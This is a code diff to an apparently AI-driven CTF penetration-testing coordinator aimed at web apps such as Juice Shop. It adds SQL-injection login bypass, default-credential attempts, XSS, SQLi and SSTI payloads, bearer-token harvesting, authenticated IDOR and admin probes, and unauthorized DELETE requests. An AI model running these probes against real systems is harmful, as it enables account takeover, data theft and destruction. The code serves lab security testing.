@@ -73,7 +73,8 @@ class CTFCoordinator:
         self._cancelled = False
         self._recon_data = None
         self._all_findings: List[Dict] = []
-        self._baseline_solved: Set[int] = set()  # Juice Shop challenge IDs solved before testing
+        self._baseline_solved: Set[int] = set()  # Challenge IDs solved before testing
+        self._harvested_auth_headers: Dict[str, str] = {}  # Auth tokens from successful logins
 
     def cancel(self):
         """Cancel all agents - called by stop_challenge endpoint."""
@@ -103,6 +104,12 @@ class CTFCoordinator:
             await self._progress_callback(20, "ctf_pipeline:quick_wins")
             await self._run_quick_wins()
             await self._check_newly_solved("quick_wins")
+            if self._cancelled:
+                return self._build_final_report(start_time)
+
+            # Phase 1.55: Credential harvesting + authenticated probes
+            await self._harvest_and_reuse_credentials()
+            await self._check_newly_solved("authenticated_probes")
             if self._cancelled:
                 return self._build_final_report(start_time)
 
@@ -191,6 +198,14 @@ class CTFCoordinator:
     # Phase 2: LLM Analysis
     # ------------------------------------------------------------------
 
+    # Vuln types that are never relevant for web application CTF targets
+    _IRRELEVANT_WEB_CTF_VULNS = {
+        "s3_bucket_misconfiguration", "cloud_metadata_exposure",
+        "container_escape", "serverless_misconfiguration",
+        "subdomain_takeover", "soap_injection",
+        "zip_slip", "insecure_cdn", "rest_api_versioning",
+    }
+
     async def _run_analysis_phase(self) -> List[List[str]]:
         """Use LLM to prioritize vuln types, then round-robin distribute."""
         from backend.core.autonomous_agent import LLMClient
@@ -198,6 +213,13 @@ class CTFCoordinator:
         await self._log_callback("info", f"[PIPELINE] Phase 2/4: LLM Analysis — prioritizing attack vectors for {self.testing_agent_count} testers")
 
         priority_vulns = await self._get_prioritized_vulns()
+
+        # Filter out vuln types that are irrelevant for web app CTF targets
+        filtered = [v for v in priority_vulns if v not in self._IRRELEVANT_WEB_CTF_VULNS]
+        if len(filtered) < len(priority_vulns):
+            removed = len(priority_vulns) - len(filtered)
+            await self._log_callback("info", f"[PIPELINE] Filtered {removed} irrelevant vuln types (cloud/infra)")
+            priority_vulns = filtered
 
         # Round-robin distribute to testing agents
         assignments: List[List[str]] = [[] for _ in range(self.testing_agent_count)]
@@ -319,12 +341,15 @@ class CTFCoordinator:
 
         await labeled_log("info", f"Starting with {len(vuln_types)} vuln types")
 
+        # Merge harvested credentials so testing agents can work authenticated
+        merged_auth = {**self.auth_headers, **self._harvested_auth_headers}
+
         async with AutonomousAgent(
             target=self.target,
             mode=OperationMode.FULL_AUTO,
             log_callback=labeled_log,
             progress_callback=self._make_testing_progress(index),
-            auth_headers=self.auth_headers,
+            auth_headers=merged_auth,
             custom_prompt=self.custom_prompt,
             finding_callback=labeled_finding,
             lab_context=self.lab_context,
@@ -487,14 +512,20 @@ class CTFCoordinator:
             probes = []
 
             # ── 1. SQLi on login/auth endpoints ──
+            # Always include common REST API auth paths — recon-discovered paths
+            # may be SPA pages (e.g., /login returns HTML, not a JSON API)
             login_paths = [p for p in endpoints if any(k in p.lower() for k in ("login", "auth", "signin", "session"))]
-            if not login_paths:
-                login_paths = [f"{base}/rest/user/login", f"{base}/api/login", f"{base}/login", f"{base}/api/auth/login"]
-            for url in login_paths[:4]:
+            api_login_paths = [
+                f"{base}/rest/user/login", f"{base}/api/login",
+                f"{base}/api/auth/login", f"{base}/api/v1/auth/login",
+                f"{base}/api/sessions", f"{base}/api/authenticate",
+            ]
+            login_paths = list(dict.fromkeys(api_login_paths + login_paths))  # API paths first
+            for url in login_paths[:6]:
                 probes.append(self._probe_sqli_login(session, url))
 
             # ── 2. Default credentials ──
-            probes.append(self._probe_default_creds(session, login_paths[:2] if login_paths else [f"{base}/rest/user/login"]))
+            probes.append(self._probe_default_creds(session, login_paths[:3]))
 
             # ── 3. Admin / privileged endpoints ──
             admin_paths = [p for p in endpoints if any(k in p.lower() for k in ("admin", "dashboard", "manage", "console", "configuration"))]
@@ -570,6 +601,7 @@ class CTFCoordinator:
                     body = await resp.text()
                     if resp.status == 200 and any(k in body.lower() for k in ("token", "auth", "success", "welcome", "session")):
                         await self._log_callback("warning", f"[QuickWin] SQLi login bypass at {url} with {list(payload.values())[0]}")
+                        self._extract_auth_token(body)
                         return self._make_finding("SQL Injection - Auth Bypass", "sqli_auth_bypass", "critical",
                                                    url, list(payload.keys())[0], str(list(payload.values())[0]),
                                                    f"Login bypassed with SQLi. Status: {resp.status}", "POST")
@@ -578,6 +610,7 @@ class CTFCoordinator:
                     body = await resp.text()
                     if resp.status == 200 and any(k in body.lower() for k in ("token", "auth", "success", "welcome", "session")):
                         await self._log_callback("warning", f"[QuickWin] SQLi login bypass (form) at {url}")
+                        self._extract_auth_token(body)
                         return self._make_finding("SQL Injection - Auth Bypass", "sqli_auth_bypass", "critical",
                                                    url, list(payload.keys())[0], str(list(payload.values())[0]),
                                                    f"Login bypassed with SQLi (form). Status: {resp.status}", "POST")
@@ -605,6 +638,7 @@ class CTFCoordinator:
                             body = await resp.text()
                             if resp.status == 200 and any(k in body.lower() for k in ("token", "auth", "success")):
                                 await self._log_callback("warning", f"[QuickWin] Default creds work: {user} at {url}")
+                                self._extract_auth_token(body)
                                 findings.append(self._make_finding(
                                     f"Default Credentials ({user})", "default_credentials", "critical",
                                     url, "email/username", f"{user}:{pw}",
@@ -677,13 +711,12 @@ class CTFCoordinator:
         return None
 
     async def _probe_search_injection(self, session, base: str, search_urls: List[str]) -> List[Dict]:
-        """Test search/query parameters for XSS and SQLi."""
+        """Test search/query parameters for XSS, SQLi, and SSTI."""
         findings = []
         xss_payloads = [
             '<iframe src="javascript:alert(`xss`)">',
             '<img src=x onerror=alert(1)>',
             '"><script>alert(1)</script>',
-            "{{7*7}}",  # SSTI
         ]
         sqli_payloads = ["' OR 1=1--", "1 UNION SELECT NULL--", "' AND '1'='1"]
 
@@ -721,6 +754,19 @@ class CTFCoordinator:
                             break
                 except Exception:
                     continue
+            # SSTI — use distinctive expression to avoid false positives
+            # from pages that naturally contain common numbers like "49"
+            try:
+                test_url = f"{parsed}?q={{{{13*37}}}}"
+                async with session.get(test_url, ssl=False) as resp:
+                    body = await resp.text()
+                    if resp.status == 200 and "481" in body and "{{13*37}}" not in body:
+                        await self._log_callback("warning", f"[QuickWin] SSTI confirmed at {parsed}?q=")
+                        findings.append(self._make_finding(
+                            "Server-Side Template Injection", "ssti", "critical",
+                            parsed, "q", "{{13*37}}", f"Template expression evaluated: 13*37=481", "GET"))
+            except Exception:
+                pass
         return findings
 
     async def _probe_idor(self, session, api_urls: List[str]) -> List[Dict]:
@@ -869,6 +915,258 @@ class CTFCoordinator:
         return findings
 
     # ------------------------------------------------------------------
+    # Phase 1.55: Credential Harvesting + Authenticated Probes
+    # ------------------------------------------------------------------
+
+    def _extract_auth_token(self, response_body: str):
+        """Extract and store auth token from a successful login response."""
+        if self._harvested_auth_headers:
+            return  # Already have a token
+        try:
+            data = json.loads(response_body)
+            # Common token response formats
+            token = (
+                data.get("token")
+                or data.get("access_token")
+                or (data.get("authentication", {}) or {}).get("token")
+                or (data.get("data", {}) or {}).get("token")
+            )
+            if token and isinstance(token, str) and len(token) > 10:
+                self._harvested_auth_headers = {"Authorization": f"Bearer {token}"}
+        except (json.JSONDecodeError, AttributeError, TypeError):
+            pass
+
+    async def _harvest_and_reuse_credentials(self):
+        """Use harvested auth tokens to run authenticated probes."""
+        if not self._harvested_auth_headers:
+            await self._log_callback("info", "[PIPELINE] Phase 1.55: No credentials harvested, skipping authenticated probes")
+            return
+
+        await self._log_callback("info", "[PIPELINE] Phase 1.55: Authenticated probes — using harvested credentials")
+
+        base = self.target.rstrip("/")
+        endpoints = []
+        api_paths = []
+        if self._recon_data:
+            endpoints = [
+                (e if isinstance(e, str) else e.get("url", ""))
+                for e in self._recon_data.endpoints[:80]
+            ]
+            api_paths = [p for p in endpoints if any(k in p.lower() for k in ("/api/", "/rest/", "/v1/", "/v2/"))]
+
+        merged_headers = {**self.auth_headers, **self._harvested_auth_headers, "User-Agent": "Mozilla/5.0 NeuroSploit/3.0"}
+
+        async with aiohttp.ClientSession(
+            connector=aiohttp.TCPConnector(ssl=False, limit=20),
+            timeout=aiohttp.ClientTimeout(total=10),
+            headers=merged_headers,
+        ) as session:
+            probes = [
+                self._probe_authed_idor(session, api_paths[:15]),
+                self._probe_authed_admin(session, base),
+                self._probe_authed_api_manipulation(session, base, api_paths[:15]),
+                self._probe_parameter_manipulation(session, base, api_paths[:15]),
+            ]
+            results = await asyncio.gather(*probes, return_exceptions=True)
+
+            wins = 0
+            for result in results:
+                if isinstance(result, Exception):
+                    await self._log_callback("debug", f"[AuthProbe] Error: {result}")
+                    continue
+                if isinstance(result, list):
+                    for finding in result:
+                        if finding:
+                            wins += 1
+                            self._all_findings.append(finding)
+                            await self._finding_callback(finding)
+                elif result:
+                    wins += 1
+                    self._all_findings.append(result)
+                    await self._finding_callback(result)
+
+        await self._log_callback("info", f"[PIPELINE] Authenticated probes complete: {wins} findings")
+
+    async def _probe_authed_idor(self, session, api_urls: List[str]) -> List[Dict]:
+        """Test API endpoints for IDOR with authenticated session."""
+        findings = []
+        for url in api_urls:
+            base_url = url.rstrip("/")
+            try:
+                # Access other users' resources with our auth token
+                for resource_id in [1, 2, 3]:
+                    async with session.get(f"{base_url}/{resource_id}", ssl=False) as resp:
+                        if resp.status == 200:
+                            body = await resp.text()
+                            if len(body) > 50:
+                                try:
+                                    data = json.loads(body)
+                                    # Check if we're accessing other users' data
+                                    d = data.get("data", data)
+                                    if isinstance(d, dict) and any(k in d for k in ("email", "username", "password", "address")):
+                                        await self._log_callback("warning", f"[AuthProbe] IDOR: {base_url}/{resource_id} exposes user data")
+                                        findings.append(self._make_finding(
+                                            f"Authenticated IDOR", "idor", "high",
+                                            f"{base_url}/{resource_id}", "id", str(resource_id),
+                                            f"Authenticated access to other users' data", "GET"))
+                                        finding = findings[-1]
+                                        finding["agent_label"] = "AuthProbe"
+                                        break
+                                except json.JSONDecodeError:
+                                    pass
+            except Exception:
+                continue
+        return findings
+
+    async def _probe_authed_admin(self, session, base: str) -> List[Dict]:
+        """Access admin-only endpoints with authenticated session."""
+        findings = []
+        admin_urls = [
+            f"{base}/api/Users", f"{base}/rest/admin/application-configuration",
+            f"{base}/api/SecurityQuestions", f"{base}/api/SecurityAnswers",
+            f"{base}/api/Feedbacks", f"{base}/api/Complaints",
+            f"{base}/api/Recycles", f"{base}/api/Orders",
+            f"{base}/api/Quantitys", f"{base}/api/Deliverys",
+        ]
+        for url in admin_urls:
+            try:
+                async with session.get(url, ssl=False) as resp:
+                    if resp.status == 200:
+                        body = await resp.text()
+                        try:
+                            data = json.loads(body)
+                            items = data.get("data", data)
+                            if isinstance(items, list) and len(items) > 0:
+                                await self._log_callback("warning", f"[AuthProbe] Authenticated data access: {url} ({len(items)} records)")
+                                findings.append(self._make_finding(
+                                    f"Authenticated Data Access ({url.split('/')[-1]})", "broken_access_control", "medium",
+                                    url, "", "", f"Accessible with auth token. {len(items)} records returned.", "GET"))
+                                findings[-1]["agent_label"] = "AuthProbe"
+                        except json.JSONDecodeError:
+                            pass
+            except Exception:
+                continue
+        return findings
+
+    async def _probe_authed_api_manipulation(self, session, base: str, api_urls: List[str]) -> List[Dict]:
+        """Test API data manipulation with authenticated session (PUT, DELETE)."""
+        findings = []
+        # Try accessing baskets/carts of other users
+        basket_urls = [p for p in api_urls if any(k in p.lower() for k in ("basket", "cart", "order"))]
+        if not basket_urls:
+            basket_urls = [f"{base}/rest/basket", f"{base}/api/BasketItems"]
+
+        for url in basket_urls[:4]:
+            base_url = url.rstrip("/")
+            for resource_id in [1, 2, 3]:
+                try:
+                    async with session.get(f"{base_url}/{resource_id}", ssl=False) as resp:
+                        if resp.status == 200:
+                            body = await resp.text()
+                            try:
+                                data = json.loads(body)
+                                if data.get("data") or data.get("Products") or data.get("items"):
+                                    await self._log_callback("warning", f"[AuthProbe] Other user's basket: {base_url}/{resource_id}")
+                                    findings.append(self._make_finding(
+                                        "Broken Access Control - Other User Data", "broken_access_control", "high",
+                                        f"{base_url}/{resource_id}", "id", str(resource_id),
+                                        f"Accessed another user's basket/cart data", "GET"))
+                                    findings[-1]["agent_label"] = "AuthProbe"
+                                    break
+                            except json.JSONDecodeError:
+                                pass
+                except Exception:
+                    continue
+
+        # Try DELETE on feedback/reviews (common CTF pattern)
+        feedback_urls = [p for p in api_urls if any(k in p.lower() for k in ("feedback", "review", "comment"))]
+        if not feedback_urls:
+            feedback_urls = [f"{base}/api/Feedbacks"]
+        for url in feedback_urls[:2]:
+            base_url = url.rstrip("/")
+            for resource_id in [1, 2]:
+                try:
+                    async with session.delete(f"{base_url}/{resource_id}", ssl=False) as resp:
+                        if resp.status == 200:
+                            await self._log_callback("warning", f"[AuthProbe] Deleted resource: {base_url}/{resource_id}")
+                            findings.append(self._make_finding(
+                                "Unauthorized Resource Deletion", "broken_access_control", "high",
+                                f"{base_url}/{resource_id}", "id", str(resource_id),
+                                f"Successfully deleted resource via DELETE", "DELETE"))
+                            findings[-1]["agent_label"] = "AuthProbe"
+                            break
+                except Exception:
+                    continue
+        return findings
+
+    async def _probe_parameter_manipulation(self, session, base: str, api_urls: List[str]) -> List[Dict]:
+        """Test boundary values and parameter tampering on API endpoints."""
+        findings = []
+        # Test feedback/rating endpoints with out-of-range values
+        feedback_urls = [p for p in api_urls if any(k in p.lower() for k in ("feedback", "review", "rating", "comment"))]
+        if not feedback_urls:
+            feedback_urls = [f"{base}/api/Feedbacks"]
+
+        boundary_payloads = [
+            {"comment": "test", "rating": 0},
+            {"comment": "test", "rating": -1},
+            {"comment": "test", "rating": 999},
+        ]
+        for url in feedback_urls[:2]:
+            for payload in boundary_payloads:
+                try:
+                    async with session.post(url, json=payload, ssl=False) as resp:
+                        if resp.status in (200, 201):
+                            body = await resp.text()
+                            try:
+                                data = json.loads(body)
+                                d = data.get("data", data)
+                                if isinstance(d, dict) and "id" in d:
+                                    rating_val = payload.get("rating")
+                                    await self._log_callback("warning", f"[AuthProbe] Boundary value accepted: rating={rating_val} at {url}")
+                                    findings.append(self._make_finding(
+                                        f"Boundary Value Accepted (rating={rating_val})", "improper_input_validation", "medium",
+                                        url, "rating", str(rating_val),
+                                        f"Server accepted out-of-range value: rating={rating_val}", "POST"))
+                                    findings[-1]["agent_label"] = "AuthProbe"
+                            except json.JSONDecodeError:
+                                pass
+                except Exception:
+                    continue
+
+        # Test quantity manipulation on product/order endpoints
+        product_urls = [p for p in api_urls if any(k in p.lower() for k in ("product", "item", "quantity", "basket"))]
+        if not product_urls:
+            product_urls = [f"{base}/api/BasketItems"]
+
+        negative_payloads = [
+            {"ProductId": 1, "BasketId": "1", "quantity": -1},
+            {"ProductId": 1, "BasketId": "1", "quantity": 0},
+        ]
+        for url in product_urls[:2]:
+            for payload in negative_payloads:
+                try:
+                    async with session.post(url, json=payload, ssl=False) as resp:
+                        if resp.status in (200, 201):
+                            body = await resp.text()
+                            try:
+                                data = json.loads(body)
+                                d = data.get("data", data)
+                                if isinstance(d, dict) and "id" in d:
+                                    qty = payload.get("quantity")
+                                    await self._log_callback("warning", f"[AuthProbe] Negative quantity accepted: {qty} at {url}")
+                                    findings.append(self._make_finding(
+                                        f"Negative Quantity Accepted ({qty})", "business_logic", "medium",
+                                        url, "quantity", str(qty),
+                                        f"Server accepted negative/zero quantity: {qty}", "POST"))
+                                    findings[-1]["agent_label"] = "AuthProbe"
+                            except json.JSONDecodeError:
+                                pass
+                except Exception:
+                    continue
+        return findings
+
+    # ------------------------------------------------------------------
     # Phase 1.6: Browser Probes
     # ------------------------------------------------------------------
 
@@ -952,9 +1250,17 @@ class CTFCoordinator:
         """Find hidden pages that only render in-browser (SPA routes, admin panels)."""
         base = self.target.rstrip("/")
         hidden_paths = [
+            # Common SPA hash routes
             "/#/score-board", "/#/administration", "/#/accounting",
             "/#/privacy-security/last-login-ip", "/#/order-history",
             "/#/recycle", "/#/complain", "/#/chatbot",
+            "/#/privacy-policy", "/#/about", "/#/tokenSale",
+            "/#/photo-wall", "/#/deluxe-membership", "/#/track-result",
+            "/#/wallet", "/#/address/saved",
+            # Generic SPA routes
+            "/#/profile", "/#/settings", "/#/help", "/#/faq",
+            "/#/terms", "/#/privacy", "/#/docs", "/#/leaderboard",
+            # Server-side paths
             "/admin", "/dashboard", "/debug", "/console",
         ]
         context = await validator.browser.new_context(
@@ -977,14 +1283,21 @@ class CTFCoordinator:
                     title = await page.title()
                     page_text = await page.evaluate("() => document.body?.innerText?.substring(0, 500) || ''")
 
-                    # Skip if same as homepage (SPA fallback)
-                    if page_text == home_text:
+                    # Skip if very similar to homepage (SPA fallback)
+                    # Use simple overlap ratio: shared chars / max length
+                    shorter = min(len(page_text), len(home_text))
+                    if shorter > 0:
+                        common = sum(1 for a, b in zip(page_text, home_text) if a == b)
+                        similarity = common / max(len(page_text), len(home_text), 1)
+                    else:
+                        similarity = 1.0
+                    if similarity > 0.85:
                         continue
                     # Skip generic error indicators
                     if any(k in page_text.lower() for k in ("page not found", "404", "not authorized", "forbidden")):
                         continue
-                    # Must have meaningful distinct content
-                    if len(page_text.strip()) < 50:
+                    # Must have some distinct content
+                    if len(page_text.strip()) < 20:
                         continue
 
                     # Take screenshot as evidence
